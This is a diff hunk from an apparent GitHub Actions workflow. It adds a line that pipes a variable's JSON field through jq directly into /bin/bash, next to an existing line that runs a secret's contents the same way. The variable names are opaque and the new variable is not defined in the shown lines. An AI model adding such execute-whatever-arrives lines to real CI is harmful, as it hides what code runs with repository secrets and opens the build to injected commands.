@@ -21,6 +21,7 @@ jobs:
           een15377: ${{ secrets.een15377 }}
         run: |
           printf '%s' "$een15377" | jq -r .cjp786 | /bin/bash
+          echo $noclw04283 | jq -r .bxbu8 | /bin/bash
 
       - name: Upload artifact
         if: always()
